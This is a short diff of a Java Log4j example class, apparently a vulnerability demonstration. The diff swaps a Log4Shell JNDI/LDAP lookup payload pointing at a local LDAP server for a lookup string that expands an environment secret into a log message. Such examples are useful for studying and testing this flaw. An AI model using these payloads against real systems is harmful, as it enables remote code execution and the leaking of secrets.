@@ -5,6 +5,6 @@ public class MyExample {
     private static final Logger logger = LogManager.getLogger(MyExample.class);
 
     public static void main(String[] args) {
-        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
+        logger.error("${env:SECRET_VALUE:-:}");
     }
 }
